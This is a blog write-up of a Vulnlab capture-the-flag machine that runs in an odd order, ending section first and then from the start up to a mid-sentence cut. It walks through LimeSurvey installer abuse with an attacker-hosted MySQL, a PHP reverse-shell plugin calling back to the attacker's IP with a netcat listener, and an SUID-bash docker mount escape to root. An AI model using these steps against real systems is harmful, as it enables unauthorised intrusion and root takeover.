<code>/opt/limesurvey</code> is denoted as <code>/var/www/html/survey</code>, which is the base directory of the LimeSurvey service.</p>\n<p>So the exploitation for this seems to be relatively simple. First since I didn’t do it before, we’ll login to the docker container as root due to the <code>limesvc</code> user’s sudo privileges.</p>\n<p>If you run into a <code>sudo</code> error that states you need a proper terminal to read the password, I would usually recommend just creating a proper shell with tools like Python or <code>stty</code>. The issue is that we’re in a docker container and don’t have access to either of those tools - thus I’d recommend using a C2 such as <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> to have it create a proper terminal for you.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">limesvc@efaa6f5097ed:/home/limesvc$ sudo -l</span><br><span class=\"line\">[sudo] password for limesvc: </span><br><span class=\"line\">Matching Defaults entries for limesvc on efaa6f5097ed:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User limesvc may run the following commands on efaa6f5097ed:</span><br><span class=\"line\">    (ALL : ALL) ALL</span><br><span class=\"line\">limesvc@efaa6f5097ed:/home/limesvc$</span><br><span class=\"line\"></span><br><span class=\"line\">limesvc@efaa6f5097ed:/home/limesvc$ sudo su</span><br><span class=\"line\">root@efaa6f5097ed:/home/limesvc# whoami</span><br><span class=\"line\">root</span><br><span class=\"line\">root@efaa6f5097ed:/home/limesvc#</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Exploiting-Mounted-Root-SUID-Binary\"><a href=\"#Exploiting-Mounted-Root-SUID-Binary\" class=\"headerlink\" title=\"Exploiting Mounted Root-SUID Binary\"></a>Exploiting Mounted Root-SUID Binary</h1><p>So just a brief snippet of how sudo privileges work, our <code>root</code> user has an ID value of 0, in which every default root user will have this privilege ID value set. Our <code>limesvc</code> on our SSH user does not have this ID set to them, and is not allowed to run any values within the context of root.</p>\n<p>However, we do have the privileges of root within our docker container and a way to transfer this file to our host machine. Thus, if we are able to change the contents of a shell binary in our docker container, have it adopt the privileges of root, and adjust the SUID bit of the binary - we should be able to escalate our privileges.</p>\n<p>So first we’ll copy the <code>/bin/bash</code> binary in our docker container to the mounted directory <code>/var/www/html/survey</code>. I’ll also rename the binary to <code>./daz</code>.</p>\n<p><code>root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./daz</code></p>\n<p>We’ll then adjust the SUID bit of the binary using <code>chmod</code>. As context as to what this does - we’re essentially saying to allow all users to be able to run this binary in the context of the root user. That means ANY user will be able to run this as root.</p>\n<p><code>root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./daz</code></p>\n<p>Now, we should be able to go back to our SSH session and verify that the file is there.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">limesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz</span><br><span class=\"line\">-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see now that this file is owned by root, but we’ll still be able to run it as our current user. If we run it with the <code>-p</code> option (which stands for privileged mode), it should generate a session for us as root.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">limesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz</span><br><span class=\"line\">-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz</span><br><span class=\"line\">limesvc@ip-10-10-200-233:/opt/limesurvey$ ./daz -p</span><br><span class=\"line\">daz-5.1# whoami</span><br><span class=\"line\">root</span><br><span class=\"line\">daz-5.1#</span><br></pre></td></tr></table></figure>\n\n<p>And that’s it! The root flag is within <code>/root/root.txt</code>, and thus we have completed this machine.</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Big thanks to xct for creating this machine, it was very fun and helped strengthen some post-exploitation methodologies that I had experienced briefly in the past. The LimeSurvey installation was also really interesting and helped with some brainstorming into the attack path.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/\">https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/</a><br><a href=\"https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B\">https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&amp;text=To%20create%20a%20new%20user,localhost&#39;%20IDENTIFIED%20BY%20&#39;password&#39;%3B</a><br><a href=\"https://github.com/Y1LD1R1M-1337/Limesurvey-RCE\">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</a><br><a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\">https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</a><br><a href=\"https://github.com/cdk-team/CDK\">https://github.com/cdk-team/CDK</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This machine was relatively fun, as it involved progressing through the installation of an unused web-application - which we will then exploit. Big props to xct for creating this machine, as I thought it was great learning material and fun to exploit.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scan to see what ports are open.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 21:55 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.113.195</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT   STATE SERVICE VERSION</span><br><span class=\"line\">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   256 25:94:a4:a0:85:b6:06:ae:b3:7b:5e:45:c1:b6:32:b5 (ECDSA)</span><br><span class=\"line\">|_  256 22:d1:a0:9e:e2:58:92:d3:7b:9d:86:0f:04:28:8c:65 (ED25519)</span><br><span class=\"line\">80/tcp open  http    Apache httpd 2.4.56</span><br><span class=\"line\">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class=\"line\">|_http-title: 403 Forbidden</span><br><span class=\"line\">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class=\"line\">Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%)</span><br><span class=\"line\">No exact OS matches for host (test conditions non-ideal).</span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 22/tcp)</span><br><span class=\"line\">HOP RTT       ADDRESS</span><br><span class=\"line\">1   99.64 ms  10.8.0.1</span><br><span class=\"line\">2   102.00 ms 10.10.113.195</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 42.32 seconds</span><br></pre></td></tr></table></figure>\n\n<p>I see a lot of these on HTB, so I’m relatively used to seeing just port 22 (SSH) and port 80 (HTTP) open. Nonetheless let’s see specifically what’s running on the web server.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/b.jpg\"></p>\n<p>This is interesting, as immediately the moment we try to access the base link for the website, it says we do not have access to the resource. At this point, I’m assuming that we are guaranteed to find subdirectories from a <code>gobuster</code> scan, since we have no other resources to access at this point.<br><code>gobuster dir -u http://10.10.113.195/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>\n<p>Upon a brief few seconds of scanning, we are greeted with a 301 redirect to <code>/survey</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/survey               (Status: 301) [Size: 315] [--&gt; http://10.10.113.195/survey/]</span><br><span class=\"line\">/server-status        (Status: 403) [Size: 278]</span><br><span class=\"line\">Progress: 220560 / 220561 (100.00%)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Finished</span><br><span class=\"line\">===============================================================</span><br></pre></td></tr></table></figure>\n\n<p>Upon accessing the redirect, we are brought to an installation page for <code>LimeSurvey</code>.</p>\n<h1 id=\"Exploiting-Limesurvey-Installation\"><a href=\"#Exploiting-Limesurvey-Installation\" class=\"headerlink\" title=\"Exploiting Limesurvey Installation\"></a>Exploiting Limesurvey Installation</h1><p>Based off some research, it seems as though LimeSurvey is an open-source survey application that is used to develop online surveys and quizzes for its audience. It’s primarily built up in PHP and utilizes SQL database applications such as MySQL, PostgreSQL, or even the Windows alternative of MSSQL.</p>\n<p>This specific product seems to be marketed towards researchers, universities, web developers and students alike.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/b_1.jpg\"></p>\n<p>I researched into a few CVEs for LimeSurvey 6.3.7, however there wasn’t much that I could find regarding our specific instance of it. Most of the CVEs related to versions 5.0, 3.0, and a few versions in between.</p>\n<p>Nonetheless, we can progress with the installation, so we’ll continue to do that until something particularly interesting comes up.</p>\n<p>I’ve listed my thoughts on each section of the installation page below in the form of a list and what I think we could potentially accomplish.</p>\n<ol>\n<li>Welcome -&gt; Contains Language selection and <code>installation start</code> option.</li>\n<li>License -&gt; Regulatory information, nothing out of the ordinary.</li>\n<li>Pre-installation Check -&gt; Contains vital information regarding the services used for this LimeSurvey instance.</li>\n</ol>\n<p>I’d like to point out something interesting - it seems as though a MySQL database option is present within the pre-installation check. That being said, we could not see one on the frontend of the server (based off our NMAP scan), nor is the option checked off within this screen.</p>\n<p>The other information on this page does not seem to be as important, as the PHP version does not seem to be exploitable to my awareness.</p>\n<ol start=\"4\">\n<li>Configuration -&gt; Main attack path concern, allows us to configure various parts of the application - namely the database.</li>\n</ol>\n<p>As explained previously, this section of the installation page seemed odd at first glance as it allows us to configure the MySQL database association with our LimeSurvey instance.</p>\n<ol start=\"5\">\n<li>Database settings -&gt; Unconfigurable until database configuration is completed.</li>\n<li>Administrator settings -&gt; Unconfigurable until database configuration is completed.</li>\n</ol>\n<p>As I explained previously, the database configuration portion of the installation seems the most interesting. The particular section within this page that I’m referring to is the <code>Database location</code> section, which is seemingly allowing us to allocate an IP address of a database to the LimeSurvey instance.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/c.jpg\"></p>\n<p>While this is preset to <code>localhost</code>, I don’t see any reason as to why we couldn’t alter this to potentially point somewhere else - such as to our own machine.</p>\n<h1 id=\"Local-MySQL-Configuration\"><a href=\"#Local-MySQL-Configuration\" class=\"headerlink\" title=\"Local MySQL Configuration\"></a>Local MySQL Configuration</h1><p>So with that in mind, let’s try to set up our own MySQL database server within our attack machine. <a href=\"https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/\">https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">daz@daz$ sudo apt install mariadb-server</span><br><span class=\"line\"></span><br><span class=\"line\">daz@daz$ sudo systemctl start mysql</span><br><span class=\"line\"></span><br><span class=\"line\">daz@daz$ sudo service mysql status</span><br><span class=\"line\">● mariadb.service - MariaDB 10.11.6 database server</span><br><span class=\"line\">     Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; preset: disabled)</span><br><span class=\"line\">     Active: active (running) since Tue 2024-05-14 22:52:07 EDT; 1min 36s ago</span><br><span class=\"line\">     [...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">daz@daz$ sudo mysql</span><br></pre></td></tr></table></figure>\n\n<p>So we’ll need to specify a user to authenticate as for our particular case, which I used this <a href=\"https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B\">article</a> on StrongDM to help with.</p>\n<p>I’ll outline the steps we need to take in order to create a database and set up the necessary privileges to a user for our LimeSurvey installation.</p>\n<p>First we’ll need to create a database to use, since LimeSurvey requires a <code>Database name</code> to be supplied with the installation.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; CREATE DATABASE limesurvey;</span><br><span class=\"line\">Query OK, 1 row affected (0.001 sec)</span><br></pre></td></tr></table></figure>\n\n<p>Next, we’ll create a user under the alias <code>lime_user</code> who will have all of the necessary privileges to our setup.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; CREATE USER &#x27;lime_user&#x27;@&#x27;%&#x27; IDENTIFIED by &#x27;lime_user&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">Query OK, 0 rows affected (0.006 sec)</span><br></pre></td></tr></table></figure>\n\n<p>Note that the <code>%</code> in our user creation query essentially acts as a wildcard for all interfaces.</p>\n<p>The next concern we need to focus on is the specific privileges that our user has in relation to what we need for the setup. To any beginners, a MySQL privilege is essentially any ruleset or specified rule that a MySQL user has that regulates their actions on a database. This essentially restricts the user into performing various actions on the database based on the privileges they are given. This can be broken up into 4 different types of privileges:</p>\n<p><strong>Global Privileges</strong>: These privileges apply to every database on the hosted server. By default, administrative privileges will fall into this category as they enable a user to perform operations that are relative to a specific database.<br><strong>Database Privileges</strong>: As expected in the name, these privileges apply solely to specified databases and all objects within those databases (i.e. columns, tables, entries, etc.).<br><strong>Proxy Privileges</strong>: These allow a user to act in the context of other users and adopt their same privileges within the space of the situation they are involved in.<br><strong>Object Privileges</strong>: These privileges apply solely to the types of objects stored in a database and can be granted between a set of objects if needed.</p>\n<p>In a red-teaming environment such as an enterprise infrastructure, we’d want to create a user that looks relatively normal and in-line with regular options as not to arise suspicious. We can do this by delegating specific privileges to them such as <code>INSERT</code> or <code>ALTER</code> dependent on what is needed for the setup.</p>\n<p>However this won’t be the case for our situation, so we can grant them <code>ALL PRIVILEGES</code> so they can perform any actions needed.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; GRANT ALL ON *.* TO &#x27;lime_user&#x27;@&#x27;%&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">Query OK, 0 rows affected (0.006 sec)</span><br></pre></td></tr></table></figure>\n\n<p>Note that we’re essentially saying that our username&#x2F;password is <code>lime_user:lime_user</code> with the above query.*</p>\n<p>We can confirm that our privileges have been granted to the specific user with the below query.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; SHOW GRANTS for &#x27;lime_user&#x27;@&#x27;%&#x27;;</span><br><span class=\"line\">+-------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class=\"line\">| Grants for lime_user@%                                                                                                              |</span><br><span class=\"line\">+-------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class=\"line\">| GRANT ALL PRIVILEGES ON *.* TO `lime_user`@`%` IDENTIFIED BY PASSWORD &#x27;*0F1EF1AB79F549AD4FE495927D8C200E7413BD85&#x27; WITH GRANT OPTION |</span><br><span class=\"line\">+-------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class=\"line\">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>\n\n\n<p>Another thing we’ll also need to do is configure the bind address for our MySQL server. By default, it’s meant to listen solely on localhost as it acts as a backend server.</p>\n<p>We can do this by editing <code>/etc/mysql/mariadb.conf.d/50-server.cnf</code> and changing the <code>bind-address</code> to <code>0.0.0.0</code> to listen on all interfaces.</p>\n<p>This should allow the remote configuration to access our MySQL server and populate any fields needed. We can then restart our MySQL server with <code>sudo systemctl restart mysql</code></p>\n<p>We’ll also need flush all of our privileges to ensure that they are configured correctly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; FLUSH PRIVILEGES;</span><br><span class=\"line\">Query OK, 0 rows affected (0.001 sec)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Redirecting-Database-Configuration-to-Local-MySQL\"><a href=\"#Redirecting-Database-Configuration-to-Local-MySQL\" class=\"headerlink\" title=\"Redirecting Database Configuration to Local MySQL\"></a>Redirecting Database Configuration to Local MySQL</h1><p>With that, our backend database configuration should be finished and ready for the LimeSurvey setup. We’ll fill in the necessary parameters into the configuration page and hope for any progress.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/d.jpg\"></p>\n<p>If we have followed all the previous steps and select the <code>Next</code> button, we can see that we’re greeted with a message that is asking us to populate the <code>limesurvey</code> database. It also tells us that the database already exists, since we’ve already created it the previous setup steps. We’ll select <code>Populate database</code>.</p>\n<p>Afterwards, we’re brought to an administration configuration, to which we can configure our admin credentials to just be <code>daz:daz</code> and just populate the rest with fake information.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/e.jpg\"></p>\n<p>It then notifies us that our password has been confirmed and that it will allow us to authenticate to the administration panel. We’ll select <code>Administration</code> to access this panel.*</p>\n<p>We’re brought to a login page, to which we can use the same credentials that we provided within the configuration portion of the setup.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/f.jpg\"></p>\n<h1 id=\"Limesurvey-RCE\"><a href=\"#Limesurvey-RCE\" class=\"headerlink\" title=\"Limesurvey RCE\"></a>Limesurvey RCE</h1><p>We’re greeted with the LimeSurvey administration panel, which seems to have a lot of stuff from us to mess with. Upon first glance, I was immediately drawn into the <code>Plugin</code> and <code>Theme</code> functionalities within the <code>Configuration</code> tab, so we’ll see if we can potentially upload anything for RCE.</p>\n<p>Generally with web-applications like these, if we’re allowed to upload a plugin, we can upload a malicious reverse shell and have it callback to our machine.</p>\n<p>The resource we’ll use to generate our reverse shell can be found <a href=\"https://github.com/Y1LD1R1M-1337/Limesurvey-RCE\">here</a>.</p>\n<p>The steps can be outlined below for how I used it, though you can also reference the README file within the repository on how to use it.</p>\n<p>Firstly, let’s clone the repository with <code>git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git</code>. This will clone the repository to our machine, to which we can use the files within it.</p>\n<p>According to the README, all that is required of us is to compress the <code>php-rev.php</code> and <code>config.xml</code> to a zip file and upload it as a plugin. There are a few prerequisites that we’ll need to take into account in terms of file changes before sending the plugin into the server.</p>\n<p>First, let’s change the <code>php-rev.php</code> IP address and port to point to a netcat reverse shell that we’ll stand up on our attack machine in a few moments.</p>\n<p><code>$ip = &#39;10.8.0.173&#39;;</code><br><code>$port = 9001;</code></p>\n<p>Next, we’ll need to change the <code>config.xml</code> to make it usable on our current LimeSurvey version. If we do not change this, LimeSurvey will tell us that our plugin is incompatible when we attempt to upload it. This is within the <code>&lt;compatibility&gt;</code> subcategory within the xml file.</p>\n<p><code>&lt;version&gt;6.3.7&lt;/version&gt;</code></p>\n<p>Afterwards, let’s start a netcat reverse shell to listen on our attack machine so we can receive a callback when the reverse shell is executed.</p>\n<p><code>nc -lvnp 9001</code></p>\n<p>Finally, let’s compress the two files to a zip archive and prepare to send it in to LimeSurvey.</p>\n<p><code>zip Y1LD1R1M.zip config.xml php-rev.php</code></p>\n<p>We can now upload our archive to the LimeSurvey <code>Plugins</code> panel, as denoted below.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/g.jpg\"></p>\n<p>If we have performed all the steps prior correctly, LimeSurvey will allow us to install the plugin after this page.</p>\n<p>The plugin can now be accessed at <code>http://10.10.113.195/survey/upload/plugins/Y1LD1R1M/php-rev.php</code>.</p>\n<p>Accessing this will execute our reverse shell and generate a session for us through netcat as the <code>limesvc</code> user.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/h.jpg\"></p>\n<h1 id=\"Host-Reconnaissance\"><a href=\"#Host-Reconnaissance\" class=\"headerlink\" title=\"Host Reconnaissance\"></a>Host Reconnaissance</h1><p>Now that we are on the system and have successfully exploited the web-application, though you’ll find that there is no user flag.</p>\n<p>This was relatively confusing, as I looked within the Wiki and found that there was indeed a user flag that was present on the machine.</p>\n<p>To make our enumeration a little easier, I uploaded the <code>Linpeas</code> script which you can find <a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\">here</a>. <code>Linpeas</code> will essentially enumerate the entire filesystem and return and pertinent information it finds for us.</p>\n<p>After running the <code>Linpeas</code> script on the remote machine, you’ll find in it’s output that there is an environment variable set that lists the password of the user through SSH.</p>\n<p><code>LIMESURVEY_PASS=[...snip...]</code></p>\n<p>Also, you’ll notice that there are a large amount of docker settings and configurations present on the machine, making me assume that we’re currently in a docker container.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/docker/overlay2/l/P5AO7VJP3KS26RV7L4G4A3CQMO:/var/lib/docker/overlay2/l/DUMS4MOPBZYYCT5MLU3KOIHV67:/var/lib/docker/overlay2/l/E6PFD55HUOLSDVI5HFVSG2MKY6:/var/lib/docker/overlay2/l/F2C2GU57ABILW44DR6N7IOAS2U:/var/lib/docker/overlay2/l/MTDNHTDTAHLYFOE23OONITLATE:/var/lib/docker/overlay2/l/HVR5FUOEP75JC4WLOLQCLICZW5:/var/lib/docker/overlay2/l/45JVDGBN2HJGR4ZFC56CA3QEFE:/var/lib/docker/overlay2/l/BLHTPLHTIDJITGF5LG7NDGIHIQ:/var/lib/docker/overlay2/l/ON6NXIXZRZZCFUPSYDLFPND5XG:/var/lib/docker/overlay2/l/URCYD6PEIO427ROGBDDSPOX7X4:/var/lib/docker/overlay2/l/TKNY7I37KDSR7UM34B7EAJWLEX:/var/lib/docker/overlay2/l/NI6IE4U3RKI3MI3XAZ7VSTRT5U:/var/lib/docker/overlay2/l/R2CP4KV5O4GJ4TW3FS73ARJZUR:/var/lib/docker/overlay2/l/JENNFERKWWS2TYSPK7WT7IGYT4:/var/lib/docker/overlay2/l/MMP56DFNWIP27YOKHUYTI3CVJ4:/var/lib/docker/overlay2/l/UBBT3YOEP4MEDPPJR5X4D474QX:/var/lib/docker/overlay2/l/ZHODKFSJJ4IAMIIQW7GBHG5QA3:/var/lib/docker/overlay2/l/WHNHWNHOFTA3DGNRVL3B3MMNY6:/var/lib/docker/overlay2/l/TQ6Z55HNEUJUXYWNUWJ4E5BLR3:/var/lib/docker/overlay2/l/UVBX7ES72OROVYQQPYGPTEIA4D:/var/lib/docker/overlay2/l/HCBBV74XSEA5GRAMKLUM7VELUP:/var/lib/docker/overlay2/l/VNQTVVELYXHIW5JNA2W7VHHGHA,upperdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/diff,workdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/work,nouserxattr)</span><br><span class=\"line\">/etc/apache2/conf-available/docker-php.conf-&lt;FilesMatch \\.php$&gt;</span><br><span class=\"line\">/etc/apache2/conf-available/docker-php.conf:\tSetHandler application/x-httpd-php</span><br><span class=\"line\">/etc/apache2/conf-enabled/docker-php.conf-&lt;FilesMatch \\.php$&gt;</span><br><span class=\"line\">/etc/apache2/conf-enabled/docker-php.conf:\tSetHandler application/x-httpd-php</span><br><span class=\"line\">2023-12-02+15:30:12.4134549900 /.dockerenv</span><br><span class=\"line\">/.dockerenv</span><br></pre></td></tr></table></figure>\n\n<p>Since we technically have credentials to the machine, we could try using SSH and logging into the machine. To my surprise, this worked and we can find a usable user.txt flag within the home directory of the <code>limesvc</code> user.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/i.jpg\"></p>\n<p>Now that we have the user flag, we can continue to enumerate for privilege escalation.</p>\n<h1 id=\"Docker-Breakout-Privilege-Escalation\"><a href=\"#Docker-Breakout-Privilege-Escalation\" class=\"headerlink\" title=\"Docker Breakout Privilege Escalation\"></a>Docker Breakout Privilege Escalation</h1><p>We can run <code>sudo -l</code> with the user’s password to determine any privileges that we have as this user. Unfortunately, this does not return any valid results as <code>user limesvc may not run sudo</code>.</p>\n<p>We’ll need to find another way for privilege escalation aside from privileges. Since we had to breakout of a docker container earlier, we can try and see if there’s an additional privilege escalation vector we can potentially do on the machine in order to gain <code>root</code>.</p>\n<p>One of the common vectors of attack through docker breakouts is utilizing mounts. Mounts essentially allow you to exchange or download files to and from the respective client machine (whether that be the docker container or the actual host itself). I had to exploit this through an NFS share on my Hybrid writeup. It involved us having to view the NFS read&#x2F;write permissions on the share that was mounted, write a file to it, and then copy the permissions to the binary before running it as another user. While this was relatively easy to view the permissions via the NFS share, this is a different story with docker containers.</p>\n<p>A great solution to visualize the permissions for mounts on a docker container is by utilizing <a href=\"https://github.com/cdk-team/CDK\">CDK</a>, a toolset that was made to enumerate container capabilities. This will be helpful to run on the docker container, as it’ll help us determine if there are any to exploit.</p>\n<p>Note that I uploaded the <code>CDK</code> binary through sliver, if you want to do it manually you can use <code>curl</code> with parameters <code>http://(IP):(PORT)/cdk_linux_amd64 -O cdk</code> and also stand up a simple Python HTTP server on your host (just as an example).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ./cdk_linux_amd64 evaluate --full &gt; cdk.txt</span><br><span class=\"line\"></span><br><span class=\"line\">sliver&gt; download cdk.txt</span><br></pre></td></tr></table></figure>\n\n<p>This file has been downloaded on our host, and you’ll see an output of capabilities printed to your screen when you try to read it. Let’s focus on the <code>Mounts</code> section.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[  Information Gathering - Mounts  ]</span><br><span class=\"line\">0:45 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/doc</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro</span><br><span class=\"line\">259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hostname /etc/hostname rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro</span><br><span class=\"line\">259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hosts /etc/hosts rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro</span><br><span class=\"line\">259:1 /opt/limesurvey /var/www/html/survey rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro</span><br><span class=\"line\">0:48 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:48 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:48 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:48 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:48 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:53 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64</span><br><span class=\"line\">0:49 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64</span><br><span class=\"line\">0:49 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64</span><br><span class=\"line\">0:49 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64</span><br><span class=\"line\">0:54 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64</span><br><span class=\"line\">0:55 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64</span><br></pre></td></tr></table></figure>\n\n<p>While a lot of these don’t seem very interesting, you’ll notice that there’s a mount pointing towards <code>/opt/limesurvey</code> on the host machine. We can confirm that this is a folder by checking through our SSH session on the host machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">limesvc@ip-10-10-200-233:/opt/limesurvey$ ls</span><br><span class=\"line\">LICENSE      admin        docs         installer  node_modules      psalm-all.xml     setdebug.php  upload</span><br><span class=\"line\">README.md    application  gulpfile.js  locale     open-api-gen.php  psalm-strict.xml  themes        vendor</span><br><span class=\"line\">SECURITY.md  assets       index.php    modules    plugins           psalm.xml         tmp</span><br></pre></td></tr></table></figure>\n\n<p>It seems that the mount specifically is 